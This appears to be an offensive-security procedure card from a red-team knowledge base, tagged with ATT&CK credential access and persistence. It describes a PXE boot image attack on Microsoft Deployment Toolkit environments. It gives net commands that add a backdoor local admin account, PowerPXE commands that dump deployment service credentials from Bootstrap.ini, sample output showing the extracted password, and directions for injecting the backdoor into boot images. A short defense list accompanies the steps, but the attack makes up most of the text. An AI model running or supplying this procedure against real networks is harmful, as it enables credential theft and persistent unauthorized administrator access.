---
id: 352d7dc8-cded-4e1d-8192-1c78c4f87c43
name: pxe-boot-image-attack-local-admin-hijack
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:08.406065+00:00'
updated_at: '2023-04-10T20:36:00.755243+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - '[[techniques/Account Manipulation|T1098 - Account Manipulation]]'
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/PXE Boot image attack]]'
commands:
  - '[[commands/add-windows-local-admin-user]]'
  - '[[commands/import-powerpxe-module]]'
  - '[[commands/start-pxe-creds-exploitation]]'
platforms:
  - Windows
tools:
  - '[[tools/powerpxe]]'
validated: true
---

# PXE Boot Image Attack - Local Admin Account Hijack

## Summary

This procedure outlines how to perform a PXE boot image attack to hijack local administrator accounts on Windows machines in an environment using Microsoft Deployment Toolkit (MDT) for imaging. By intercepting the PXE boot process with the PowerPXE module, attackers can extract service account credentials from the boot image's Bootstrap.ini file. These credentials provide access to the deployment share, enabling modification of boot images to inject scripts that create backdoor local admin accounts. Once the target machine boots from the modified image, the attacker gains persistent local admin access for lateral movement.

## Description

In environments relying on PXE for automated deployments, boot images contain configuration files like Bootstrap.ini with embedded credentials for the deployment service account. This procedure uses PowerPXE, a PowerShell module, to simulate a PXE client, capture the boot files via TFTP, and parse them to dump these credentials. With the extracted UserID and UserPassword, the attacker can authenticate to the deployment share (e.g., \\SERVER\DeploymentShare$) and alter the LiteTouchPE.wim image to include a payload script that adds a new local admin account upon boot. This technique bypasses the need for domain credentials and establishes persistence on target machines, especially effective where local admins have elevated network privileges. The attack assumes the attacker has network proximity to the PXE/DHCP server and targets Windows environments with MDT or similar imaging solutions.

## Requirements

1. Network access to the target's PXE/DHCP infrastructure (same segment as deployment servers).
2. PowerShell execution policy allowing script imports (Bypass or Unrestricted).
3. PowerPXE.ps1 module downloaded and available locally.
4. Knowledge of the target's network interface for spoofing PXE requests.
5. Administrative privileges on the attacker's machine for running the module.

## Defense

- Disable PXE booting on unauthorized devices via DHCP reservations or 802.1X.
- Use credential guards like LAPS for local admins and avoid embedding plaintext creds in boot images.
- Monitor TFTP traffic for anomalous downloads and parse logs for unexpected PXE requests.
- Implement network segmentation to isolate imaging servers from production segments.
- Regularly rotate service account passwords and encrypt configuration files in deployment shares.

## Objectives

1. Intercept PXE boot process to extract deployment service credentials.
2. Access the deployment share using extracted credentials to modify boot images.
3. Inject a backdoor script into the boot image to create a persistent local admin account on targets.
4. Achieve local admin access on booted machines for lateral movement without domain creds.

## Instructions

### Step 1: Prepare Backdoor Payload for Local Admin Hijack

**Context**: Create a simple script that adds a backdoor local administrator account. This payload will be injected into the modified boot image to run during the target's PXE boot process, granting persistent access.

**Code** ([[codes/add-backdoor-local-admin-windows]]):

```powershell
net user hacker Password123! /add
net localgroup administrators /add hacker
```

> This code uses native Windows net commands to add a user 'hacker' with password 'Password123!' and elevate it to the administrators group. Run this during boot via a custom task in the modified WIM file. Expected output: 'The command completed successfully' for both lines, confirming the account creation.

### Step 2: Import PowerPXE Module

**Context**: Load the PowerPXE PowerShell module to enable PXE exploitation capabilities. This module handles DHCP discovery, TFTP downloads, and parsing of boot files.

**Command** ([[commands/import-powerpxe-module]]):

```powershell
Import-Module .\PowerPXE.ps1
```

> Import the module from its local path. If successful, no output is shown, but subsequent Get-PXEcreds commands will be available. Verify by checking for the module in Get-Module.

### Step 3: Start PXE Credentials Exploitation

**Context**: Initiate the PXE client simulation on the specified network interface to intercept the boot process. The tool will request a DHCP lease, download the BCD file, parse it for WIM paths, download the WIM files, and extract data from Bootstrap.ini to reveal credentials.

**Command** ([[commands/start-pxe-creds-exploitation]]):

```powershell
Get-PXEcreds -InterfaceAlias $_INTERFACE
```

> Replace $_INTERFACE with the attacker's network adapter name (e.g., 'Ethernet' or 'lab 0'). The tool automates the sequence: DHCP request, BCD download via TFTP, WIM identification and download, and parsing. Monitor the console for progress.

**Expected Output**:

```
DHCP proposal IP address: 192.168.22.101
DHCP Validation: DHCPACK
IP address configured: 192.168.22.101

BCD File path: \Tmp\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd
TFTP IP Address: 192.168.22.3

Launch TFTP download
Transfer succeeded.

Parse the BCD file: conf.bcd
Identify wim file: \Boot\x86\Images\LiteTouchPE_x86.wim
Identify wim file: \Boot\x64\Images\LiteTouchPE_x64.wim

Launch TFTP download
Transfer succeeded.

Open LiteTouchPE_x86.wim
Finding Bootstrap.ini
DeployRoot = \\LAB-MDT\DeploymentShare$
UserID = MdtService
UserPassword = Somepass1
```

> Success is indicated by the extraction of DeployRoot, UserID, and UserPassword from Bootstrap.ini. Use these (e.g., MdtService:Somepass1) to authenticate to the share and mount/edit the WIM files with tools like DISM to inject the backdoor payload from Step 1 into the boot script (e.g., via CustomSettings.ini or a startup task).
